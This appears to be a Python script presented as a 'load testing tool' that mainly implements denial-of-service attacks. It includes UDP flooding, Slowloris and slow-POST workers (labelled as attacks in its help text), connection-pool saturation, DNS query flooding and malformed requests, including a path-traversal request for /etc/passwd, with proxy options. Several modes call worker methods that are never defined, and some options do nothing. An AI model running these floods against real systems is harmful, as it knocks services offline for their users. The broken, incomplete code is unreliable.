#!/usr/bin/env python3
import argparse
import time
import threading
import random
import requests
import httpx
import json
import csv
import socket
import hashlib
import base64
import os
import struct
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


def generate_websocket_key():
    return base64.b64encode(os.urandom(16)).decode()


class LoadTester:
    def __init__(
        self,
        url,
        total_requests,
        concurrency,
        method="GET",
        mode="flood",
        no_ssl_verify=False,
        headers=None,
        data=None,
        slow_duration=60,
        endpoints=None,
        protocol="http1",
        output=None,
        proxy=None,
        rps=0,
        client_cert=None,
        client_key=None,
        tls_version=None,
        ws=False,
        pipeline=1,
        malformed=0,
        config=None,
        real_time=False,
        proxy_chain=None,
        auth_type=None,
        auth_token=None,
        session_cookie=None,
        tls_cipher=None,
        udp_flood=False,
        raw_socket=False,
        http_smuggling=None,
        range_test=False,
        slowloris=False,
        slow_post=False,
        dns_stress=False,
    ):
        if config:
            with open(config, "r") as f:
                cfg = json.load(f)
                url = cfg.get("url", url)
                total_requests = cfg.get("requests", total_requests)
                concurrency = cfg.get("concurrency", concurrency)
                method = cfg.get("method", method)
                mode = cfg.get("mode", mode)
                no_ssl_verify = cfg.get("no_ssl_verify", no_ssl_verify)
                headers = cfg.get("headers", headers)
                data = cfg.get("data", data)
                slow_duration = cfg.get("slow_duration", slow_duration)
                endpoints = cfg.get("endpoints", endpoints)
                protocol = cfg.get("protocol", protocol)
                output = cfg.get("output", output)
                proxy = cfg.get("proxy", proxy)
                proxy_chain = cfg.get("proxy_chain", proxy_chain)
                auth_type = cfg.get("auth_type", auth_type)
                auth_token = cfg.get("auth_token", auth_token)
                session_cookie = cfg.get("session_cookie", session_cookie)
                tls_cipher = cfg.get("tls_cipher", tls_cipher)
                udp_flood = cfg.get("udp_flood", udp_flood)
                raw_socket = cfg.get("raw_socket", raw_socket)
                http_smuggling = cfg.get("http_smuggling", http_smuggling)
                range_test = cfg.get("range_test", range_test)
                slowloris = cfg.get("slowloris", slowloris)
                slow_post = cfg.get("slow_post", slow_post)
                dns_stress = cfg.get("dns_stress", dns_stress)
                rps = cfg.get("rps", rps)
                client_cert = cfg.get("client_cert", client_cert)
                client_key = cfg.get("client_key", client_key)
                tls_version = cfg.get("tls_version", tls_version)
                ws = cfg.get("ws", ws)
                pipeline = cfg.get("pipeline", pipeline)
                malformed = cfg.get("malformed", malformed)
                real_time = cfg.get("real_time", real_time)

        self.url = url
        self.total_requests = total_requests
        self.concurrency = concurrency
        self.method = method
        self.mode = mode
        self.no_ssl_verify = no_ssl_verify
        self.headers = headers or {}
        self.data = data
        self.slow_duration = slow_duration
        self.endpoints = endpoints or []
        self.protocol = protocol
        self.output = output
        self.proxy = proxy
        self.rps = rps
        self.client_cert = client_cert
        self.client_key = client_key
        self.tls_version = tls_version
        self.ws = ws
        self.pipeline = pipeline
        self.malformed = malformed
        self.real_time = real_time
        self.proxy_chain = proxy_chain or []
        self.auth_type = auth_type
        self.auth_token = auth_token
        self.session_cookie = session_cookie
        self.tls_cipher = tls_cipher
        self.udp_flood = udp_flood
        self.raw_socket = raw_socket
        self.http_smuggling = http_smuggling
        self.range_test = range_test
        self.slowloris = slowloris
        self.slow_post = slow_post
        self.dns_stress = dns_stress
        self.results = {"success": 0, "failed": 0, "response_times": [], "errors": {}}
        self.lock = threading.Lock()
        self.running = True
        self.request_count = 0
        self.last_request_time = 0

    def validate_url(self):
        if self.udp_flood or self.raw_socket:
            return
        allowed_schemes = ("http", "https", "ws", "wss")
        if not self.url.startswith(allowed_schemes):
            raise ValueError(f"Invalid URL scheme. Only {allowed_schemes} are allowed.")

    def udp_worker(self):
        try:
            parsed = httpx.URL(self.url)
            host = parsed.host
            port = parsed.port or 80
        except:
            host, port = (
                self.url.split(":")[0],
                int(self.url.split(":")[1]) if ":" in self.url else 80,
            )

        payload = b"X" * 1400

        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (host, port))
                sock.close()
                with self.lock:
                    self.results["success"] += 1
            except Exception as e:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"][str(type(e).__name__)] = (
                        self.results["errors"].get(str(type(e).__name__), 0) + 1
                    )

    def slowloris_worker(self):
        try:
            parsed = httpx.URL(self.url)
            host = parsed.host
            port = parsed.port or 80
            path = parsed.path or "/"
        except:
            return

        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((host, port))

                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                sock.send(req.encode())

                for _ in range(150):
                    if not self.running:
                        break
                    time.sleep(15)
                    try:
                        sock.send(b"X-a: b\r\n")
                    except:
                        break

                sock.close()
                with self.lock:
                    self.results["success"] += 1
            except Exception as e:
                with self.lock:
                    self.results["failed"] += 1

    def slow_post_worker(self):
        try:
            parsed = httpx.URL(self.url)
            host = parsed.host
            port = parsed.port or 80
            path = parsed.path or "/"
        except:
            return

        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((host, port))

                req = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Length: 1000\r\n\r\n"
                )
                sock.send(req.encode())

                for _ in range(100):
                    if not self.running:
                        break
                    time.sleep(3)
                    try:
                        sock.send(b"x=1&")
                    except:
                        break

                sock.close()
                with self.lock:
                    self.results["success"] += 1
            except Exception as e:
                with self.lock:
                    self.results["failed"] += 1

    def dns_worker(self):
        try:
            parts = self.url.split("/")[-1].split(":")
            host = parts[0] if parts else self.url
            port = int(parts[1]) if len(parts) > 1 else 53
        except:
            return

        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)

                transaction_id = random.randint(0, 65535)

                dns_query = struct.pack("!HHHHHH", transaction_id, 0x0100, 1, 0, 0, 0)

                domain = host.split(".")[0] if "." in host else host
                dns_query += (
                    bytes([len(domain)]) + domain.encode() + bytes([0, 0, 1, 0, 1])
                )

                sock.sendto(dns_query, (host, port))
                try:
                    sock.recv(512)
                except:
                    pass
                sock.close()

                with self.lock:
                    self.results["success"] += 1
            except Exception as e:
                with self.lock:
                    self.results["failed"] += 1

    def make_request(self):
        if self.rps > 0:
            with self.lock:
                now = time.time()
                min_interval = 1.0 / self.rps
                if now - self.last_request_time < min_interval:
                    time.sleep(min_interval - (now - self.last_request_time))
                self.last_request_time = time.time()

        start = time.time()
        try:
            target_url = self.get_target_url()
            kwargs = {"timeout": 10, "verify": not self.no_ssl_verify}

            if self.malformed > 0:
                self.send_malformed_request(target_url, kwargs)
                with self.lock:
                    self.results["success"] += 1
                    self.results["response_times"].append(time.time() - start)
                return

            if self.headers:
                kwargs["headers"] = self.headers.copy()
            if self.auth_type and self.auth_token:
                if self.auth_type == "bearer":
                    kwargs["headers"]["Authorization"] = f"Bearer {self.auth_token}"
                elif self.auth_type == "basic":
                    import base64

                    kwargs["headers"]["Authorization"] = f"Basic {self.auth_token}"
                elif self.auth_type == "jwt":
                    kwargs["headers"]["Authorization"] = f"Bearer {self.auth_token}"
            if self.session_cookie:
                if "Cookie" in kwargs["headers"]:
                    kwargs["headers"]["Cookie"] += f"; {self.session_cookie}"
                else:
                    kwargs["headers"]["Cookie"] = self.session_cookie
            if self.data:
                kwargs["data"] = self.data
            if self.proxy:
                kwargs["proxies"] = {"http": self.proxy, "https": self.proxy}
            if self.client_cert:
                kwargs["cert"] = (
                    self.client_cert
                    if not self.client_key
                    else (self.client_cert, self.client_key)
                )

            if self.protocol == "h2":
                response = self.make_httpx_request(target_url, kwargs)
            elif self.method == "GET":
                response = requests.get(target_url, **kwargs)
            else:
                response = requests.post(target_url, **kwargs)

            elapsed = time.time() - start
            status = response.status_code

            with self.lock:
                if 200 <= status < 300:
                    self.results["success"] += 1
                else:
                    self.results["failed"] += 1
                    err = f"HTTP {status}"
                    self.results["errors"][err] = self.results["errors"].get(err, 0) + 1
                self.results["response_times"].append(elapsed)

        except requests.exceptions.Timeout:
            with self.lock:
                self.results["failed"] += 1
                self.results["errors"]["Timeout"] = (
                    self.results["errors"].get("Timeout", 0) + 1
                )
        except requests.exceptions.ConnectionError:
            with self.lock:
                self.results["failed"] += 1
                self.results["errors"]["Connection Error"] = (
                    self.results["errors"].get("Connection Error", 0) + 1
                )
        except Exception as e:
            with self.lock:
                self.results["failed"] += 1
                self.results["errors"][str(type(e).__name__)] = (
                    self.results["errors"].get(str(type(e).__name__), 0) + 1
                )

    def saturation_worker(self):
        if self.protocol == "h2":
            self.saturation_worker_httpx()
            return

        session = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=self.concurrency,
            pool_maxsize=self.concurrency,
            max_retries=Retry(total=0),
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        while self.running:
            try:
                target_url = self.get_target_url()
                start = time.time()
                kwargs = {"timeout": 30, "verify": not self.no_ssl_verify}
                if self.headers:
                    kwargs["headers"] = self.headers
                if self.data:
                    kwargs["data"] = self.data
                if self.proxy:
                    kwargs["proxies"] = {"http": self.proxy, "https": self.proxy}
                if self.client_cert:
                    kwargs["cert"] = (
                        self.client_cert
                        if not self.client_key
                        else (self.client_cert, self.client_key)
                    )

                if self.method == "GET":
                    response = session.get(target_url, **kwargs)
                else:
                    response = session.post(target_url, **kwargs)

                elapsed = time.time() - start

                with self.lock:
                    if 200 <= response.status_code < 300:
                        self.results["success"] += 1
                    else:
                        self.results["failed"] += 1
                        self.results["errors"][f"HTTP {response.status_code}"] = (
                            self.results["errors"].get(
                                f"HTTP {response.status_code}", 0
                            )
                            + 1
                        )
                    self.results["response_times"].append(elapsed)

            except requests.exceptions.Timeout:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"]["Timeout"] = (
                        self.results["errors"].get("Timeout", 0) + 1
                    )
            except requests.exceptions.ConnectionError:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"]["Connection Error"] = (
                        self.results["errors"].get("Connection Error", 0) + 1
                    )
            except Exception as e:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"][str(type(e).__name__)] = (
                        self.results["errors"].get(str(type(e).__name__), 0) + 1
                    )

    def saturation_worker_httpx(self):
        proxies = (
            {"http://": self.proxy, "https://": self.proxy} if self.proxy else None
        )
        transport = httpx.HTTPTransport(retries=0, proxies=proxies)
        client = httpx.Client(
            transport=transport, verify=not self.no_ssl_verify, http2=True
        )

        while self.running:
            try:
                target_url = self.get_target_url()
                start = time.time()
                kwargs = {"timeout": 30}
                if self.headers:
                    kwargs["headers"] = self.headers
                if self.data:
                    kwargs["content"] = self.data

                if self.method == "GET":
                    response = client.get(target_url, **kwargs)
                else:
                    response = client.post(target_url, **kwargs)

                elapsed = time.time() - start

                with self.lock:
                    if 200 <= response.status_code < 300:
                        self.results["success"] += 1
                    else:
                        self.results["failed"] += 1
                        self.results["errors"][f"HTTP {response.status_code}"] = (
                            self.results["errors"].get(
                                f"HTTP {response.status_code}", 0
                            )
                            + 1
                        )
                    self.results["response_times"].append(elapsed)

            except httpx.TimeoutException:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"]["Timeout"] = (
                        self.results["errors"].get("Timeout", 0) + 1
                    )
            except httpx.ConnectError:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"]["Connection Error"] = (
                        self.results["errors"].get("Connection Error", 0) + 1
                    )
            except Exception as e:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"][str(type(e).__name__)] = (
                        self.results["errors"].get(str(type(e).__name__), 0) + 1
                    )

        client.close()

    def slow_worker(self):
        session = requests.Session()
        while self.running:
            try:
                target_url = self.get_target_url()
                start = time.time()
                kwargs = {
                    "timeout": self.slow_duration + 10,
                    "verify": not self.no_ssl_verify,
                }
                if self.headers:
                    kwargs["headers"] = self.headers
                if self.data:
                    kwargs["data"] = self.data

                if self.method == "GET":
                    response = session.get(target_url, **kwargs)
                else:
                    response = session.post(target_url, **kwargs)

                elapsed = time.time() - start

                with self.lock:
                    if 200 <= response.status_code < 300:
                        self.results["success"] += 1
                    else:
                        self.results["failed"] += 1
                        self.results["errors"][f"HTTP {response.status_code}"] = (
                            self.results["errors"].get(
                                f"HTTP {response.status_code}", 0
                            )
                            + 1
                        )
                    self.results["response_times"].append(elapsed)

            except requests.exceptions.Timeout:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"]["Timeout"] = (
                        self.results["errors"].get("Timeout", 0) + 1
                    )
            except requests.exceptions.ConnectionError:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"]["Connection Error"] = (
                        self.results["errors"].get("Connection Error", 0) + 1
                    )
            except Exception as e:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"][str(type(e).__name__)] = (
                        self.results["errors"].get(str(type(e).__name__), 0) + 1
                    )

    def ws_worker(self):
        while self.running:
            try:
                start = time.time()
                ws_url = (
                    self.url.replace("http", "ws")
                    if self.url.startswith("http")
                    else self.url
                )

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)

                parsed = httpx.URL(ws_url)
                host = parsed.host
                port = parsed.port or 80
                path = parsed.path or "/"

                sock.connect((host, port))

                key = generate_websocket_key()
                handshake = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {host}:{port}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {key}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n"
                    f"\r\n"
                )
                sock.send(handshake.encode())

                response = sock.recv(4096)
                elapsed = time.time() - start

                sock.close()

                with self.lock:
                    if b"101 Switching Protocols" in response:
                        self.results["success"] += 1
                    else:
                        self.results["failed"] += 1
                    self.results["response_times"].append(elapsed)

            except Exception as e:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"][str(type(e).__name__)] = (
                        self.results["errors"].get(str(type(e).__name__), 0) + 1
                    )

    def pipeline_worker(self):
        if self.pipeline <= 1:
            self.worker(self.total_requests // self.concurrency)
            return

        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        while self.running:
            try:
                start = time.time()
                target_url = self.get_target_url()

                kwargs = {"timeout": 30, "verify": not self.no_ssl_verify}
                if self.headers:
                    kwargs["headers"] = self.headers
                if self.data:
                    kwargs["data"] = self.data
                if self.proxy:
                    kwargs["proxies"] = {"http": self.proxy, "https": self.proxy}

                sock = session.get(target_url, **kwargs).raw

                responses = []
                for _ in range(self.pipeline):
                    resp = sock.read(4096)
                    responses.append(resp)
                    if not resp:
                        break

                sock.close()
                elapsed = time.time() - start

                with self.lock:
                    if responses:
                        self.results["success"] += len(responses)
                    else:
                        self.results["failed"] += 1
                    self.results["response_times"].append(elapsed)

            except Exception as e:
                with self.lock:
                    self.results["failed"] += 1
                    self.results["errors"][str(type(e).__name__)] = (
                        self.results["errors"].get(str(type(e).__name__), 0) + 1
                    )

    def send_malformed_request(self, target_url, kwargs):
        try:
            parsed = httpx.URL(target_url)
            host = parsed.host
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            path = parsed.path or "/"

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))

            if self.malformed == 1:
                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
            elif self.malformed == 2:
                req = f"GET {path} HTTP/9.9\r\nHost: {host}\r\n\r\n"
            elif self.malformed == 3:
                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nInvalid: \r\n\r\n"
            elif self.malformed == 4:
                req = f"GET /../etc/passwd HTTP/1.1\r\nHost: {host}\r\n\r\n"
            else:
                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"

            sock.send(req.encode())
            sock.recv(1024)
            sock.close()
        except Exception:
            pass

    def get_target_url(self):
        if self.endpoints:
            path = random.choice(self.endpoints)
            if path.startswith("/"):
                base = self.url.rstrip("/")
                return base + path
            return path
        return self.url

    def make_httpx_request(self, target_url, kwargs):
        transport = httpx.HTTPTransport(retries=0)
        proxies = (
            {"http://": self.proxy, "https://": self.proxy} if self.proxy else None
        )
        client = httpx.Client(
            transport=transport, verify=not self.no_ssl_verify, proxies=proxies
        )
        try:
            if self.method == "GET":
                response = client.get(target_url, **kwargs)
            else:
                response = client.post(target_url, **kwargs)
            return response
        finally:
            client.close()

    def worker(self, count):
        for _ in range(count):
            if not self.running:
                break
            self.make_request()
            self.request_count += 1
            if self.real_time and self.request_count % 100 == 0:
                with self.lock:
                    print(
                        f"    [+] Requests: {self.request_count}, Success: {self.results['success']}, Failed: {self.results['failed']}"
                    )

    def run(self):
        self.validate_url()

        if self.no_ssl_verify:
            print(
                "\n[!] WARNING: SSL verification is disabled. This is insecure and vulnerable to MITM attacks."
            )

        if self.ws and not self.url.startswith(("ws://", "wss://")):
            ws_url = self.url.replace("http", "ws", 1)
            self.url = ws_url

        if self.ws:
            print(f"\n[*] Starting WEBSOCKET test: {self.url}")
        else:
            print(f"\n[*] Starting {self.mode.upper()} test: {self.url}")
        print(f"    Total requests: {self.total_requests}")
        print(f"    Concurrency: {self.concurrency}")
        print(f"    Method: {self.method}")
        print(f"    Mode: {self.mode}")
        print(f"    Protocol: {self.protocol.upper()}")
        if self.proxy:
            print(f"    Proxy: {self.proxy}")
        if self.rps > 0:
            print(f"    RPS limit: {self.rps}")
        if self.pipeline > 1:
            print(f"    Pipeline: {self.pipeline}")
        if self.malformed > 0:
            print(f"    Malformed: {self.malformed}")
        if self.endpoints:
            print(f"    Endpoints: {self.endpoints}")
        if self.mode == "slow":
            print(f"    Slow duration: {self.slow_duration}s")
        if self.udp_flood:
            print(f"    UDP Flood: enabled")
        if self.raw_socket:
            print(f"    Raw Socket: enabled")
        if self.http_smuggling:
            print(f"    HTTP Smuggling: {self.http_smuggling}")
        if self.slowloris:
            print(f"    Slowloris: enabled")
        if self.slow_post:
            print(f"    Slow POST: enabled")
        if self.dns_stress:
            print(f"    DNS Stress: enabled")

        start_time = time.time()

        if self.udp_flood:
            threads = []
            for _ in range(self.concurrency):
                t = threading.Thread(target=self.udp_worker)
                t.start()
                threads.append(t)

            time.sleep(self.total_requests / 100)

            self.running = False
            for t in threads:
                t.join()
        elif self.raw_socket:
            threads = []
            for _ in range(self.concurrency):
                t = threading.Thread(target=self.raw_tcp_worker)
                t.start()
                threads.append(t)

            time.sleep(self.total_requests / 100)

            self.running = False
            for t in threads:
                t.join()
        elif self.http_smuggling:
            threads = []
            for _ in range(self.concurrency):
                t = threading.Thread(target=self.smuggling_worker)
                t.start()
                threads.append(t)

            time.sleep(self.total_requests / 100)

            self.running = False
            for t in threads:
                t.join()
        elif self.slowloris:
            threads = []
            for _ in range(self.concurrency):
                t = threading.Thread(target=self.slowloris_worker)
                t.start()
                threads.append(t)

            time.sleep(self.total_requests / 10)

            self.running = False
            for t in threads:
                t.join()
        elif self.slow_post:
            threads = []
            for _ in range(self.concurrency):
                t = threading.Thread(target=self.slow_post_worker)
                t.start()
                threads.append(t)

            time.sleep(self.total_requests / 10)

            self.running = False
            for t in threads:
                t.join()
        elif self.dns_stress:
            threads = []
            for _ in range(self.concurrency):
                t = threading.Thread(target=self.dns_worker)
                t.start()
                threads.append(t)

            time.sleep(self.total_requests / 100)

            self.running = False
            for t in threads:
                t.join()
        elif self.range_test:
            threads = []
            for _ in range(self.concurrency):
                t = threading.Thread(target=self.range_worker)
                t.start()
                threads.append(t)

            time.sleep(self.total_requests / 100)

            self.running = False
            for t in threads:
                t.join()
        elif self.ws:
            threads = []
            for _ in range(self.concurrency):
                t = threading.Thread(target=self.ws_worker)
                t.start()
                threads.append(t)

            time.sleep(self.total_requests / 100)

            self.running = False
            for t in threads:
                t.join()
        elif self.mode == "saturation":
            threads = []
            for _ in range(self.concurrency):
                t = threading.Thread(target=self.saturation_worker)
                t.start()
                threads.append(t)

            time.sleep(self.total_requests / 100)

            self.running = False
            for t in threads:
                t.join()
        elif self.mode == "slow":
            threads = []
            for _ in range(self.concurrency):
                t = threading.Thread(target=self.slow_worker)
                t.start()
                threads.append(t)

            time.sleep(self.total_requests * self.slow_duration / self.concurrency)

            self.running = False
            for t in threads:
                t.join()
        elif self.pipeline > 1:
            threads = []
            for _ in range(self.concurrency):
                t = threading.Thread(target=self.pipeline_worker)
                t.start()
                threads.append(t)

            time.sleep(self.total_requests / 100)

            self.running = False
            for t in threads:
                t.join()
        else:
            threads = []
            requests_per_thread = self.total_requests // self.concurrency

            for _ in range(self.concurrency):
                t = threading.Thread(target=self.worker, args=(requests_per_thread,))
                t.start()
                threads.append(t)

            for t in threads:
                t.join()

            self.running = False

        duration = time.time() - start_time

        self.print_results(duration)

    def print_results(self, duration):
        mode_name = self.mode.upper()
        print("\n" + "=" * 50)
        print(f"{mode_name} RESULTS")
        print("=" * 50)

        total = self.results["success"] + self.results["failed"]
        rps = total / duration

        print(f"Duration:     {duration:.2f}s")
        print(f"Total reqs:   {total}")
        print(f"RPS:          {rps:.2f}")
        print(f"Success:      {self.results['success']}")
        print(f"Failed:       {self.results['failed']}")

        if self.results["response_times"]:
            times = self.results["response_times"]
            avg = sum(times) / len(times)
            min_t = min(times)
            max_t = max(times)

            print(f"\nResponse times:")
            print(f"  Avg:        {avg * 1000:.2f}ms")
            print(f"  Min:        {min_t * 1000:.2f}ms")
            print(f"  Max:        {max_t * 1000:.2f}ms")

        if self.results["failed"] > 0:
            error_rate = (self.results["failed"] / total) * 100
            print(f"\nError rate:   {error_rate:.2f}%")

        if self.results["errors"]:
            print(f"\nErrors:")
            for err, count in self.results["errors"].items():
                print(f"  {err}:       {count}")

        print("=" * 50)

        if self.output:
            self.export_results(duration, rps, total)

    def export_results(self, duration, rps, total):
        if self.output == "json":
            with open(f"results_{int(time.time())}.json", "w") as f:
                json.dump(
                    {
                        "mode": self.mode,
                        "url": self.url,
                        "duration": round(duration, 2),
                        "total_requests": total,
                        "rps": round(rps, 2),
                        "success": self.results["success"],
                        "failed": self.results["failed"],
                        "avg_response_ms": round(
                            sum(self.results["response_times"])
                            / len(self.results["response_times"])
                            * 1000,
                            2,
                        )
                        if self.results["response_times"]
                        else 0,
                        "errors": self.results["errors"],
                    },
                    f,
                    indent=2,
                )
            print(f"\n[+] Results exported to results_{int(time.time())}.json")
        elif self.output == "csv":
            filename = f"results_{int(time.time())}.csv"
            with open(filename, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(
                    [
                        "mode",
                        "url",
                        "duration",
                        "total_requests",
                        "rps",
                        "success",
                        "failed",
                        "avg_response_ms",
                    ]
                )
                avg_resp = (
                    sum(self.results["response_times"])
                    / len(self.results["response_times"])
                    * 1000
                    if self.results["response_times"]
                    else 0
                )
                writer.writerow(
                    [
                        self.mode,
                        self.url,
                        round(duration, 2),
                        total,
                        round(rps, 2),
                        self.results["success"],
                        self.results["failed"],
                        round(avg_resp, 2),
                    ]
                )
            print(f"\n[+] Results exported to {filename}")


def main():
    parser = argparse.ArgumentParser(description="Network Stresser - Load Testing Tool")
    parser.add_argument("url", help="Target URL (e.g., http://localhost:8080)")
    parser.add_argument(
        "-n",
        "--requests",
        type=int,
        default=1000,
        help="Total requests (default: 1000)",
    )
    parser.add_argument(
        "-c",
        "--concurrency",
        type=int,
        default=10,
        help="Concurrent threads (default: 10)",
    )
    parser.add_argument(
        "-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method"
    )
    parser.add_argument(
        "--mode",
        default="flood",
        choices=["flood", "saturation", "slow"],
        help="Test mode: flood (high requests), saturation (connection pool exhaustion), slow (long-duration requests)",
    )
    parser.add_argument(
        "-p",
        "--protocol",
        default="http1",
        choices=["http1", "h2"],
        help="HTTP protocol: http1 (HTTP/1.1) or h2 (HTTP/2)",
    )
    parser.add_argument(
        "--no-ssl-verify", action="store_true", help="Disable SSL verification"
    )
    parser.add_argument(
        "-H",
        "--header",
        action="append",
        dest="headers",
        help="Add custom header (key:value)",
    )
    parser.add_argument(
        "-e",
        "--endpoint",
        action="append",
        dest="endpoints",
        help="Add endpoint path (e.g., /api/users). Use multiple for random selection",
    )
    parser.add_argument(
        "--slow-duration",
        type=int,
        default=60,
        help="Duration for slow request mode in seconds (default: 60)",
    )
    parser.add_argument(
        "-o",
        "--output",
        choices=["json", "csv"],
        help="Export results to file (json or csv)",
    )
    parser.add_argument(
        "--rps",
        type=int,
        default=0,
        help="Max requests per second (0 = unlimited)",
    )
    parser.add_argument(
        "--client-cert",
        help="Path to client certificate file",
    )
    parser.add_argument(
        "--client-key",
        help="Path to client key file",
    )
    parser.add_argument(
        "--tls-version",
        choices=["TLSv1", "TLSv1.1", "TLSv1.2", "TLSv1.3"],
        help="Minimum TLS version",
    )
    parser.add_argument(
        "--ws",
        "--websocket",
        action="store_true",
        dest="ws",
        help="WebSocket mode",
    )
    parser.add_argument(
        "--pipeline",
        type=int,
        default=1,
        help="Number of requests to send in one connection (HTTP pipelining)",
    )
    parser.add_argument(
        "--malformed",
        type=int,
        default=0,
        choices=[0, 1, 2, 3, 4],
        help="Send malformed requests: 1=basic, 2=invalid version, 3=bad header, 4=path traversal",
    )
    parser.add_argument(
        "--proxy",
        help="Proxy URL (e.g., http://127.0.0.1:8080)",
    )
    parser.add_argument(
        "--config",
        help="Load configuration from JSON file",
    )
    parser.add_argument(
        "--real-time",
        action="store_true",
        help="Show real-time progress updates",
    )
    parser.add_argument(
        "--proxy-chain",
        nargs="+",
        help="Chain multiple proxies (e.g., --proxy-chain http://proxy1:8080 http://proxy2:3128)",
    )
    parser.add_argument(
        "--auth-type",
        choices=["bearer", "basic", "jwt"],
        help="Authentication type: bearer (token), basic (username:password), jwt",
    )
    parser.add_argument(
        "--auth-token",
        help="Authentication token or credentials",
    )
    parser.add_argument(
        "--session-cookie",
        help="Session cookie (name=value)",
    )
    parser.add_argument(
        "--tls-cipher",
        help="TLS cipher suite (e.g., ECDHE-RSA-AES256-GCM-SHA384)",
    )
    parser.add_argument(
        "--udp-flood",
        action="store_true",
        help="UDP flood mode (for non-HTTP services)",
    )
    parser.add_argument(
        "--raw-socket",
        action="store_true",
        help="Raw TCP socket mode (direct connection)",
    )
    parser.add_argument(
        "--http-smuggling",
        choices=["te-cl", "cl-te", "te-content"],
        help="HTTP request smuggling: te-cl (TEO+CL), cl-te (CL+TEO), te-content",
    )
    parser.add_argument(
        "--range-test",
        action="store_true",
        help="Test Range header (partial content requests)",
    )
    parser.add_argument(
        "--slowloris",
        action="store_true",
        help="Slowloris attack (partial header keep-alive)",
    )
    parser.add_argument(
        "--slow-post",
        action="store_true",
        help="Slow POST attack (slow body transmission)",
    )
    parser.add_argument(
        "--dns-stress",
        action="store_true",
        help="DNS server stress test",
    )

    args = parser.parse_args()

    headers = {}
    if args.headers:
        for h in args.headers:
            if ":" in h:
                key, val = h.split(":", 1)
                headers[key.strip()] = val.strip()

    tester = LoadTester(
        args.url,
        args.requests,
        args.concurrency,
        args.method,
        mode=args.mode,
        no_ssl_verify=args.no_ssl_verify,
        headers=headers if headers else None,
        endpoints=args.endpoints,
        slow_duration=args.slow_duration,
        protocol=args.protocol,
        output=args.output,
        proxy=args.proxy,
        rps=args.rps,
        client_cert=args.client_cert,
        client_key=args.client_key,
        tls_version=args.tls_version,
        ws=args.ws,
        pipeline=args.pipeline,
        malformed=args.malformed,
        config=args.config,
        real_time=args.real_time,
        proxy_chain=args.proxy_chain,
        auth_type=args.auth_type,
        auth_token=args.auth_token,
        session_cookie=args.session_cookie,
        tls_cipher=args.tls_cipher,
        udp_flood=args.udp_flood,
        raw_socket=args.raw_socket,
        http_smuggling=args.http_smuggling,
        range_test=args.range_test,
        slowloris=args.slowloris,
        slow_post=args.slow_post,
        dns_stress=args.dns_stress,
    )
    tester.run()


if __name__ == "__main__":
    main()
